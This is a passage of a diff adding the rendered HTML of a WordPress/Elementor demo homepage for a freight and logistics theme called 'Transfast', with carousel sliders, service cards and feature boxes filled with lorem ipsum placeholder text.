+</li>
+<li id="menu-item-50" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="http://demo.shrimpthemes.com/3/transfastem/about/">About</a></li>
+<li id="menu-item-47" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-47"><a href="http://demo.shrimpthemes.com/3/transfastem/services/">Services</a></li>
+</li>
+<li id="menu-item-48" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-48"><a href="http://demo.shrimpthemes.com/3/transfastem/contact/">Contact</a></li>
+</ul>							</nav>
+												</div>
+						<!-- End Primary Menu Wrapper -->
+					</div>
+				</div>
+			</div>
+			<!-- Mobile Menu  -->
+			<div class="mobile-menu"></div>
+		</div>
+	</div>	
+</header>
+
+	
+
+		<div id="content" class="site-content">		<div data-elementor-type="wp-post" data-elementor-id="6" class="elementor elementor-6" data-elementor-settings="[]">
+						<div class="elementor-inner">
+							<div class="elementor-section-wrap">
+							<section class="elementor-section elementor-top-section elementor-element elementor-element-3253652 elementor-section-stretched elementor-section-full_width elementor-section-height-default elementor-section-height-default" data-id="3253652" data-element_type="section" data-settings="{&quot;stretch_section&quot;:&quot;section-stretched&quot;}">
+						<div class="elementor-container elementor-column-gap-no">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-70c76af" data-id="70c76af" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-3c1f596 elementor-widget elementor-widget-transfastem-slider" data-id="3c1f596" data-element_type="widget" data-widget_type="transfastem-slider.default">
+				<div class="elementor-widget-container">
+			            <!-- Slider Section Start -->
+            <div class="transfastem-slider-area  textmode-reverse ">
+
+                                        <div class="transfastem-slider-active 3c1f596 owl-theme owl-carousel">
+                                                        <!-- Slider Single -->
+                            <div class="transfastem-slider-item" style="background-image: url(https://images.pexels.com/photos/2199293/pexels-photo-2199293.jpeg?auto=compress&cs=tinysrgb&dpr=2&h=650&w=940);" data-dot="&lt;i class=&quot;&quot;&gt;&lt;/i&gt;">
+                                
+                                <div class="container">
+                                    <div class="row">
+                                        <div class="transfastem-slide-content col-md-12">
+                                        <h1>FAST - SECURED - RELIABLE</h1><div class="transfastem-slide-btn"><a class="read-more" href="http://demo.shrimpthemes.com/3/transfastem/contact/" target="_blank" rel="nofollow"> Contact Us</a></div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <!-- Slider Single -->
+                                                        <!-- Slider Single -->
+                            <div class="transfastem-slider-item" style="background-image: url(https://images.pexels.com/photos/93398/pexels-photo-93398.jpeg?auto=compress&cs=tinysrgb&dpr=2&h=650&w=940);" data-dot="&lt;i class=&quot;&quot;&gt;&lt;/i&gt;">
+                                
+                                <div class="container">
+                                    <div class="row">
+                                        <div class="transfastem-slide-content col-md-12">
+											<h1>FAST - SECURED - RELIABLE</h1><div class="transfastem-slide-btn"><a class="read-more" href="http://demo.shrimpthemes.com/3/transfastem/contact/" target="_blank" rel="nofollow"> Contact Us</a></div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <!-- Slider Single -->
+                                                        <!-- Slider Single -->
+                            <div class="transfastem-slider-item" style="background-image: url(https://images.pexels.com/photos/1427107/pexels-photo-1427107.jpeg?auto=compress&cs=tinysrgb&dpr=2&h=650&w=940);" data-dot="&lt;i class=&quot;&quot;&gt;&lt;/i&gt;">
+                                
+                                <div class="container">
+                                    <div class="row">
+                                        <div class="transfastem-slide-content col-md-12">
+											<h1>FAST - SECURED - RELIABLE</h1><div class="transfastem-slide-btn"><a class="read-more" href="http://demo.shrimpthemes.com/3/transfastem/contact/" target="_blank" rel="nofollow"> Contact Us</a></div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <!-- Slider Single -->
+                                                    </div>
+                
+                <div class="container social_area">
+                                     </div>
+            </div>
+
+            <style>
+
+
+                
+                    .transfastem-slide-content h1:after {
+                        left: 50%;
+                        transform: translateX(-50%);
+                    }
+
+                   
+              
+
+            </style>
+
+            <!-- Slider Section End -->
+
+            <script type="rocketlazyloadscript" data-rocket-type="text/javascript">
+                (function($){
+
+                    var _arrows_set = true;
+                    var _autoplay_set = true;
+                    var _sl_loop_set = true;
+                    var _autoplay_speed = 500000;
+                    var _dots_set = false;
+
+                    $('.transfastem-slider-active.3c1f596').owlCarousel({
+                        items:1,
+                        loop:_sl_loop_set,
+                        margin:0,
+                        autoHeight:true,
+                        dots: _dots_set,
+                        dotsData: true,
+                        nav: _arrows_set,
+                        autoplay: _autoplay_set,
+                        autoplayTimeout:_autoplay_speed,
+                        animateOut: 'fadeOut',
+                        animateIn: 'fadeIn',
+                        navText:[ '<span>Prev</span>PREV','<span>Next</span>NEXT'],
+
+                    }); 
+                    
+                })(jQuery);
+
+            </script>
+
+        		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-7fd4012 feature_box_icon_section elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="7fd4012" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-ed08a57" data-id="ed08a57" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-284a303 elementor-view-framed elementor-shape-square elementor-position-left elementor-vertical-align-top elementor-widget elementor-widget-icon-box" data-id="284a303" data-element_type="widget" data-widget_type="icon-box.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-icon-box-wrapper">
+						<div class="elementor-icon-box-icon">
+				<span class="elementor-icon elementor-animation-" >
+				<i aria-hidden="true" class="fas fa-phone-alt"></i>				</span>
+			</div>
+						<div class="elementor-icon-box-content">
+				<h4 class="elementor-icon-box-title">
+					<span  >
+						24/7 AVAILABLE					</span>
+				</h4>
+									<p class="elementor-icon-box-description">
+						Lorem ipsum dolor sit amet, consc tur adipiscing elit, sed do eiusmo dpount ut labore et dolore amet
+
+					</p>
+							</div>
+		</div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-a6a04e4" data-id="a6a04e4" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-d63acb5 elementor-view-framed elementor-shape-square elementor-position-left elementor-vertical-align-top elementor-widget elementor-widget-icon-box" data-id="d63acb5" data-element_type="widget" data-widget_type="icon-box.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-icon-box-wrapper">
+						<div class="elementor-icon-box-icon">
+				<span class="elementor-icon elementor-animation-" >
+				<i aria-hidden="true" class="fas fa-users"></i>				</span>
+			</div>
+						<div class="elementor-icon-box-content">
+				<h4 class="elementor-icon-box-title">
+					<span  >
+						EXPERT STAFF					</span>
+				</h4>
+									<p class="elementor-icon-box-description">
+						Lorem ipsum dolor sit amet, consc tur adipiscing elit, sed do eiusmo dpount ut labore et dolore amet
+
+					</p>
+							</div>
+		</div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-8b3c4c0" data-id="8b3c4c0" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-8ba59b8 elementor-view-framed elementor-shape-square elementor-position-left elementor-vertical-align-top elementor-widget elementor-widget-icon-box" data-id="8ba59b8" data-element_type="widget" data-widget_type="icon-box.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-icon-box-wrapper">
+						<div class="elementor-icon-box-icon">
+				<span class="elementor-icon elementor-animation-" >
+				<i aria-hidden="true" class="fas fa-dollar-sign"></i>				</span>
+			</div>
+						<div class="elementor-icon-box-content">
+				<h4 class="elementor-icon-box-title">
+					<span  >
+						LOW COST					</span>
+				</h4>
+									<p class="elementor-icon-box-description">
+						Lorem ipsum dolor sit amet, consc tur adipiscing elit, sed do eiusmo dpount ut labore et dolore amet
+
+					</p>
+							</div>
+		</div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-9e6aee3 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="9e6aee3" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-7cc1b2d" data-id="7cc1b2d" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-dd957b7 elementor-widget elementor-widget-heading" data-id="dd957b7" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h3 class="elementor-heading-title elementor-size-default">WE PROVIDE</h3>		</div>
+				</div>
+				<div class="elementor-element elementor-element-1c4bf78 elementor-widget elementor-widget-heading" data-id="1c4bf78" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h2 class="elementor-heading-title elementor-size-default">WORLDWIDE FREIGHT</h2>		</div>
+				</div>
+				<div class="elementor-element elementor-element-368de0f elementor-widget elementor-widget-text-editor" data-id="368de0f" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+								<div class="elementor-text-editor elementor-clearfix">
+				<p><strong style="color: #fab704;">Transfast</strong> is the best theme for elit, sed do eiusmod tempor dolor sit amet, conse ctetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et lorna aliquatd minime</p><p>Lorem ipsum sed do eiusmod tempor dolor sit amet, conse ctetur adipiscing elit, sed dood tempor incididunt ut labore et lorna</p>					</div>
+						</div>
+				</div>
+				<section class="elementor-section elementor-inner-section elementor-element elementor-element-5cbf4bd elementor-section-full_width elementor-section-height-default elementor-section-height-default" data-id="5cbf4bd" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-b7a30dd" data-id="b7a30dd" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-5fdcc22 elementor-icon-list--layout-traditional elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list" data-id="5fdcc22" data-element_type="widget" data-widget_type="icon-list.default">
+				<div class="elementor-widget-container">
+					<ul class="elementor-icon-list-items">
+							<li class="elementor-icon-list-item">
+											<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="fas fa-arrow-circle-right"></i>						</span>
+										<span class="elementor-icon-list-text">Consumer Package Good</span>
+									</li>
+								<li class="elementor-icon-list-item">
+											<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="fas fa-arrow-circle-right"></i>						</span>
+										<span class="elementor-icon-list-text">Chemical Good</span>
+									</li>
+								<li class="elementor-icon-list-item">
+											<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="fas fa-arrow-circle-right"></i>						</span>
+										<span class="elementor-icon-list-text">Medicine & Health Support Good</span>
+									</li>
+						</ul>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-4c8eb10" data-id="4c8eb10" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-0888728 elementor-icon-list--layout-traditional elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list" data-id="0888728" data-element_type="widget" data-widget_type="icon-list.default">
+				<div class="elementor-widget-container">
+					<ul class="elementor-icon-list-items">
+							<li class="elementor-icon-list-item">
+											<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="fas fa-arrow-circle-right"></i>						</span>
+										<span class="elementor-icon-list-text">Food & Beverage</span>
+									</li>
+								<li class="elementor-icon-list-item">
+											<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="fas fa-arrow-circle-right"></i>						</span>
+										<span class="elementor-icon-list-text">Retail Package Good</span>
+									</li>
+								<li class="elementor-icon-list-item">
+											<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="fas fa-arrow-circle-right"></i>						</span>
+										<span class="elementor-icon-list-text">Energy Oil & Gas</span>
+									</li>
+						</ul>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-f8a51f4" data-id="f8a51f4" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-1ad86f8 elementor-widget elementor-widget-image" data-id="1ad86f8" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+								<div class="elementor-image">
+												<img width="597" height="397" src="http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/weprovide.jpg" class="attachment-large size-large" alt="" loading="lazy" srcset="http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/weprovide.jpg 597w, http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/weprovide-120x80.jpg 120w, http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/weprovide-300x199.jpg 300w" sizes="(max-width: 597px) 100vw, 597px" />														</div>
+						</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-841879a elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="841879a" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-64625d9" data-id="64625d9" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-c539784 elementor-widget elementor-widget-heading" data-id="c539784" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h2 class="elementor-heading-title elementor-size-default">OUR SERVICES</h2>		</div>
+				</div>
+				<div class="elementor-element elementor-element-ae51e61 elementor-widget elementor-widget-text-editor" data-id="ae51e61" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+								<div class="elementor-text-editor elementor-clearfix">
+				Transfast is the best theme for elit, sed do eiusmod tempor dolor sit amet, conse ctetur adipiscing elit, sed<br> do eiusmod tempor incididunt ut labore et lorna					</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-ff19092 elementor-widget elementor-widget-transfastem-service" data-id="ff19092" data-element_type="widget" data-widget_type="transfastem-service.default">
+				<div class="elementor-widget-container">
+			            <div class="latest-service-area">
+                <div class="pro-latest-service-active sidff19092 transfastem_indicator1">
+                    
+                                        
+                        <div class="transfastem_single_service">
+                                                        <div class="transfastem-service-thumbnail">
+                                <a href="http://demo.shrimpthemes.com/3/transfastem/transfastem_services/packing-loading/">
+                                    <img width="396" height="206" src="http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/service11.jpg" class="attachment-htmega_size_396x360 size-htmega_size_396x360 wp-post-image" alt="" loading="lazy" srcset="http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/service11.jpg 770w, http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/service11-300x156.jpg 300w, http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/service11-768x399.jpg 768w" sizes="(max-width: 396px) 100vw, 396px" />                                </a>
+                            </div>
+                            
+
+                        
+                            <div class="transfastem-service-content">
+                                <h4>
+                                    <a href="http://demo.shrimpthemes.com/3/transfastem/transfastem_services/packing-loading/">
+                                        PACKING &#038; LOADING                                    </a>
+                                </h4>
+                                <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod</p>                                <a href="http://demo.shrimpthemes.com/3/transfastem/transfastem_services/packing-loading/" class="read-more">Read More</a>
+                                                            </div>
+                        </div>
+
+
+                                        
+                                        
+                        <div class="transfastem_single_service">
+                                                        <div class="transfastem-service-thumbnail">
+                                <a href="http://demo.shrimpthemes.com/3/transfastem/transfastem_services/logistic-support/">
+                                    <img width="396" height="206" src="http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/service13.jpg" class="attachment-htmega_size_396x360 size-htmega_size_396x360 wp-post-image" alt="" loading="lazy" srcset="http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/service13.jpg 770w, http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/service13-300x156.jpg 300w, http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/service13-768x399.jpg 768w" sizes="(max-width: 396px) 100vw, 396px" />                                </a>
+                            </div>
+                            
+
+                        
+                            <div class="transfastem-service-content">
+                                <h4>
+                                    <a href="http://demo.shrimpthemes.com/3/transfastem/transfastem_services/logistic-support/">
+                                        LOGISTIC SUPPORT                                    </a>
+                                </h4>
+                                <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod</p>                                <a href="http://demo.shrimpthemes.com/3/transfastem/transfastem_services/logistic-support/" class="read-more">Read More</a>
+                                                            </div>
+                        </div>
+
+
+                                        
+                                        
+                        <div class="transfastem_single_service">
+                                                        <div class="transfastem-service-thumbnail">
+                                <a href="http://demo.shrimpthemes.com/3/transfastem/transfastem_services/warehouse-support/">
+                                    <img width="396" height="206" src="http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/service14.jpg" class="attachment-htmega_size_396x360 size-htmega_size_396x360 wp-post-image" alt="" loading="lazy" srcset="http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/service14.jpg 770w, http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/service14-300x156.jpg 300w, http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/service14-768x399.jpg 768w" sizes="(max-width: 396px) 100vw, 396px" />                                </a>
+                            </div>
+                            
+
+                        
+                            <div class="transfastem-service-content">
+                                <h4>
+                                    <a href="http://demo.shrimpthemes.com/3/transfastem/transfastem_services/warehouse-support/">
+                                        WAREHOUSE SUPPORT                                    </a>
+                                </h4>
+                                <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod</p>                                <a href="http://demo.shrimpthemes.com/3/transfastem/transfastem_services/warehouse-support/" class="read-more">Read More</a>
+                                                            </div>
+                        </div>
+
+
+                                        
+                                        
+                        <div class="transfastem_single_service">
+                                                        <div class="transfastem-service-thumbnail">
+                                <a href="http://demo.shrimpthemes.com/3/transfastem/transfastem_services/rail-freight/">
+                                    <img width="396" height="206" src="http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/service9.jpg" class="attachment-htmega_size_396x360 size-htmega_size_396x360 wp-post-image" alt="" loading="lazy" srcset="http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/service9.jpg 770w, http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/service9-300x156.jpg 300w, http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/service9-768x399.jpg 768w" sizes="(max-width: 396px) 100vw, 396px" />                                </a>
+                            </div>
+                            
+
+                        
+                            <div class="transfastem-service-content">
+                                <h4>
+                                    <a href="http://demo.shrimpthemes.com/3/transfastem/transfastem_services/rail-freight/">
+                                        RAIL FREIGHT                                    </a>
+                                </h4>
+                                <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod</p>                                <a href="http://demo.shrimpthemes.com/3/transfastem/transfastem_services/rail-freight/" class="read-more">Read More</a>
+                                                            </div>
+                        </div>
+
+
+                                        
+                                        
+                        <div class="transfastem_single_service">
+                                                        <div class="transfastem-service-thumbnail">
+                                <a href="http://demo.shrimpthemes.com/3/transfastem/transfastem_services/ocean-freight/">
+                                    <img width="396" height="206" src="http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/service7.jpg" class="attachment-htmega_size_396x360 size-htmega_size_396x360 wp-post-image" alt="" loading="lazy" srcset="http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/service7.jpg 770w, http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/service7-300x156.jpg 300w, http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/service7-768x399.jpg 768w" sizes="(max-width: 396px) 100vw, 396px" />                                </a>
+                            </div>
+                            
+
+                        
+                            <div class="transfastem-service-content">
+                                <h4>
+                                    <a href="http://demo.shrimpthemes.com/3/transfastem/transfastem_services/ocean-freight/">
+                                        OCEAN FREIGHT                                    </a>
+                                </h4>
+                                <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod</p>                                <a href="http://demo.shrimpthemes.com/3/transfastem/transfastem_services/ocean-freight/" class="read-more">Read More</a>
+                                                            </div>
+                        </div>
+
+
+                                        
+                                        
+                        <div class="transfastem_single_service">
+                                                        <div class="transfastem-service-thumbnail">
+                                <a href="http://demo.shrimpthemes.com/3/transfastem/transfastem_services/air-freight/">
+                                    <img width="396" height="206" src="http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/service6.jpg" class="attachment-htmega_size_396x360 size-htmega_size_396x360 wp-post-image" alt="" loading="lazy" srcset="http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/service6.jpg 770w, http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/service6-300x156.jpg 300w, http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/service6-768x399.jpg 768w" sizes="(max-width: 396px) 100vw, 396px" />                                </a>
+                            </div>
+                            
+
+                        
+                            <div class="transfastem-service-content">
+                                <h4>
+                                    <a href="http://demo.shrimpthemes.com/3/transfastem/transfastem_services/air-freight/">
+                                        AIR FREIGHT                                    </a>
+                                </h4>
+                                <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod</p>                                <a href="http://demo.shrimpthemes.com/3/transfastem/transfastem_services/air-freight/" class="read-more">Read More</a>
+                                                            </div>
+                        </div>
+
+
+                                                        </div>
+            </div>
+
+
+    
+        <style>
+                            .sidff19092 .slick-list{
+                    margin: 0  -15px;
+                }
+
+                      
+                            .sidff19092 .slick-slide{
+                padding: 0 15px;
+            }
+
+           
+        </style>
+
+            <script type="rocketlazyloadscript" data-rocket-type="text/javascript">
+                jQuery(document).ready(function($) {
+
+                    var _arrows_set = false;
+                    var _autoplay_set = false;
+                    var _autoplay_speed = 1000;
+                    var _showitem_set = 4;
+                    var _showitemtablet_set = 2;
+                    var _showitemmobile_set = 1;
+                    $('.pro-latest-service-active.sidff19092').slick({
+                        slidesToShow: _showitem_set,
+                        arrows:_arrows_set,
+                        dots: false,
+                        autoplay: _autoplay_set,
+                        autoplaySpeed: _autoplay_speed,
+                        prevArrow: '<div class="btn-prev"></div>',
+                        nextArrow: '<div></div>',
+                        responsive: [
+                                {
+                                  breakpoint: 991,
+                                  settings: {
+                                    slidesToShow: _showitemtablet_set
+                                  }
+                                },
+                                {
+                                  breakpoint: 768,
+                                  settings: {
+                                    slidesToShow: _showitemmobile_set
+                                  }
+                                },
+                                {
+                                  breakpoint: 575,
+                                  settings: {
+                                    slidesToShow: 1,
+                                  }
+                                }
+                              ]
+                        });
+                    
+                });
+
+            </script>
+
+           
+
+        		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-561122d elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="561122d" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-de2816c" data-id="de2816c" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-1090384 elementor-widget elementor-widget-heading" data-id="1090384" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h2 class="elementor-heading-title elementor-size-default">WHY YOU CHOOSE US</h2>		</div>
+				</div>
+				<div class="elementor-element elementor-element-42f3651 elementor-widget elementor-widget-text-editor" data-id="42f3651" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+								<div class="elementor-text-editor elementor-clearfix">
+				Transfast is the best theme for elit, sed do eiusmod tempor dolor sit amet, conse ctetur adipiscing elit, sed<br> do eiusmod tempor incididunt ut labore et lorna					</div>
+						</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-3ad0f92 choose_us_box_icon_section elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="3ad0f92" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-698bc3e" data-id="698bc3e" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-8072117 elementor-view-framed elementor-shape-square elementor-position-right elementor-vertical-align-top elementor-widget elementor-widget-icon-box" data-id="8072117" data-element_type="widget" data-widget_type="icon-box.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-icon-box-wrapper">
+						<div class="elementor-icon-box-icon">
+				<span class="elementor-icon elementor-animation-" >
+				<i aria-hidden="true" class="fas fa-home"></i>				</span>
+			</div>
+						<div class="elementor-icon-box-content">
+				<h4 class="elementor-icon-box-title">
+					<span  >
+						LARGEST WAREHOUSE					</span>
+				</h4>
+									<p class="elementor-icon-box-description">
+						Transfast porvide best theme for lio eiusmod tempor dolor 					</p>
+							</div>
+		</div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-1ce2abf elementor-view-framed elementor-shape-square elementor-position-right elementor-vertical-align-top elementor-widget elementor-widget-icon-box" data-id="1ce2abf" data-element_type="widget" data-widget_type="icon-box.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-icon-box-wrapper">
+						<div class="elementor-icon-box-icon">
+				<span class="elementor-icon elementor-animation-" >
+				<i aria-hidden="true" class="fas fa-car-alt"></i>				</span>
+			</div>
+						<div class="elementor-icon-box-content">
+				<h4 class="elementor-icon-box-title">
+					<span  >
+						GOODS TRACKING SUPPORT					</span>
+				</h4>
+									<p class="elementor-icon-box-description">
+						Transfast porvide best theme for lio eiusmod tempor dolor 					</p>
+							</div>
+		</div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-a90f015 elementor-view-framed elementor-shape-square elementor-position-right elementor-vertical-align-top elementor-widget elementor-widget-icon-box" data-id="a90f015" data-element_type="widget" data-widget_type="icon-box.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-icon-box-wrapper">
+						<div class="elementor-icon-box-icon">
+				<span class="elementor-icon elementor-animation-" >
+				<i aria-hidden="true" class="fas fa-truck-moving"></i>				</span>
+			</div>
+						<div class="elementor-icon-box-content">
+				<h4 class="elementor-icon-box-title">
+					<span  >
+						LOGISTIC SERVICES					</span>
+				</h4>
+									<p class="elementor-icon-box-description">
+						Transfast porvide best theme for lio eiusmod tempor dolor 					</p>
+							</div>
+		</div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-4a33817" data-id="4a33817" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-1ac2cf2 elementor-widget elementor-widget-image" data-id="1ac2cf2" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+								<div class="elementor-image">
+												<img width="631" height="473" src="http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/choose.jpg" class="attachment-large size-large" alt="" loading="lazy" srcset="http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/choose.jpg 631w, http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/2019/08/choose-300x225.jpg 300w" sizes="(max-width: 631px) 100vw, 631px" />														</div>
+						</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-3e0cbbc" data-id="3e0cbbc" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-07f2310 elementor-view-framed elementor-shape-square elementor-position-left elementor-vertical-align-top elementor-widget elementor-widget-icon-box" data-id="07f2310" data-element_type="widget" data-widget_type="icon-box.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-icon-box-wrapper">
+						<div class="elementor-icon-box-icon">
+				<span class="elementor-icon elementor-animation-" >
+				<i aria-hidden="true" class="fas fa-headset"></i>				</span>
+			</div>
+						<div class="elementor-icon-box-content">
+				<h4 class="elementor-icon-box-title">
+					<span  >
+						CUSTOMER SUPPORT					</span>
+				</h4>
+									<p class="elementor-icon-box-description">
+						Transfast porvide best theme for lio eiusmod tempor dolor 					</p>
+							</div>
+		</div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-81eacd7 elementor-view-framed elementor-shape-square elementor-position-left elementor-vertical-align-top elementor-widget elementor-widget-icon-box" data-id="81eacd7" data-element_type="widget" data-widget_type="icon-box.default">
+				<div class="elementor-widget-container">
